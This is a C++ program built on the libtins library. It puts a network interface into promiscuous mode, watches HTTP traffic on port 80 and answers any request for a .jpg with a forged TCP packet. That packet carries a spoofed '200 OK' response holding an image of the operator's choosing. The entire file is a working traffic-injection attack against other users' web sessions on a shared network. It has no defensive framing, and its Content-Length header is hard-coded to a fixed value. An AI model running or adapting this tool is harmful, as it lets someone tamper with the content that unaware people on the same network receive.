#include <tins/tins.h>
#include <iostream>
#include <arpa/inet.h>
#include <algorithm>
#include <fstream>
#include <tins/network_interface.h>
using namespace Tins;
using namespace std;
string mac;
char *sf_dev;
char *sd_dev;
char *path;

struct pk_set
{
    typedef HWAddress<6> address;
    EthernetII new_ethernet;
    IP new_ip;
    TCP new_tcp;
    PacketSender sender;
    uint8_t *image;
    u_int32_t len;
    EthernetII psh_attack;
    bool web_image(char *_data)
    {
        return (bool)strstr(_data,".jpg");

    }
    void image_f()
    {
        FILE *fp = fopen(path,"rb");
        fseek(fp,0,SEEK_END);//moving list array
        len = ftell(fp);
        cout<<"file size : "<<len<<"\n";
        fseek(fp,0,SEEK_SET);//moving start array
        image = (uint8_t *)malloc(len);
        if(fread(image,len,1,fp))
            cout<<"success data read\n";
        else
            cout<<"reading data failed\n";
        fclose(fp);
    }
    void sf_set()
    {
        SnifferConfiguration config;
        config.set_promisc_mode(true);
        config.set_filter("port 80");
        config.set_immediate_mode(true);
        Sniffer sniffer(sf_dev, config);
        sniffer.sniff_loop(make_sniffer_handler(this, &pk_set::handle));
    }
    void debug(EthernetII ethernet, IP ip, TCP tcp)
    {
        cout<<"ethernet<src /dst> :"<<hex<<ethernet.src_addr()<<" / "<<ethernet.dst_addr()<<"\n";
        cout<<"IP src<src /dst> :"<<dec<<ip.src_addr()<<" / "<<ip.dst_addr()<<"\n";
        cout<<"IP Check sum : "<<ip.checksum()<<"\n";
        cout<<"Tcp port<src /dst> :"<<hex<<tcp.sport()<<" / "<<tcp.dport()<<"\n";
        cout<<"tcp.seq num : "<<hex<<tcp.seq()<<"\n";
        cout<<"tcp.ack num : "<<hex<<tcp.ack_seq()<<"\n";
        cout<<"tcp flag : "<<tcp.flags()<<"\n";
        cout<<"tcp ack : "<<tcp.ACK<<"\n";
        cout<<"tcp psh : "<<tcp.PSH<<"\n";
        cout<<"tcp Check sum :"<<tcp.checksum()<<"\n";
    }
    void pk_swap(EthernetII ethernet, IP ip, TCP tcp)
    {
        //address(mac)
        new_ethernet.src_addr(address(mac));
        new_ethernet.dst_addr(ethernet.src_addr());
        new_ip.src_addr(ip.dst_addr());
        new_ip.dst_addr(ip.src_addr());
        new_tcp.sport(tcp.dport());
        new_tcp.dport(tcp.sport());
        new_tcp.flags(0x18);

    }
    void tcp_caculator(TCP tcp,uint32_t payload_len)
    {
        new_tcp.seq(tcp.ack_seq());
        new_tcp.ack_seq(tcp.seq() + payload_len);
    }
    void chg_send()
    {
        psh_attack = new_ethernet / new_ip / new_tcp / RawPDU("HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\r\nContent-Length: 1221\r\n\r\n")/RawPDU((const uint8_t *)image,len);
        sender.send(psh_attack, sd_dev);
        cout<<"send packet\n";
        debug(new_ethernet,new_ip,new_tcp);
    }
    bool handle(PDU& pdu)
    {
        const EthernetII &ethernet = pdu.rfind_pdu<EthernetII>();
        const IP &ip = pdu.rfind_pdu<IP>();
        const TCP &tcp = pdu.rfind_pdu<TCP>();
        const RawPDU& raw = tcp.rfind_pdu<RawPDU>();
        const RawPDU::payload_type& payload = raw.payload();

        if(tcp.flags() == 0x18 && tcp.dport() == 0x50 && web_image((char *)payload.data()))
        {
            pk_swap(ethernet,ip,tcp);
            tcp_caculator(tcp,payload.size());
            chg_send();
            cout<<"request packet \n";
            debug(ethernet,ip,tcp);
            cout<<payload.data()<<"\n";

        }
        return true;
    }
};
bool check(int argc, char *argv[])
{
    if(argc == 4)
    {
        sf_dev = argv[1];
        sd_dev = argv[2];
        path = argv[3];
        return true;
    }
    else
    {
        cout<<"<sniffing dev> <send dev> <jpg path>\n";
        return false;
    }
}
int main(int argc, char *argv[])
{
    cout<<"input wireless adapter mac address : ";
    cin >> mac;
    if(check(argc,argv) == false || mac.empty()) exit(1);
    pk_set ps;
    ps.image_f();
    ps.sf_set();
}
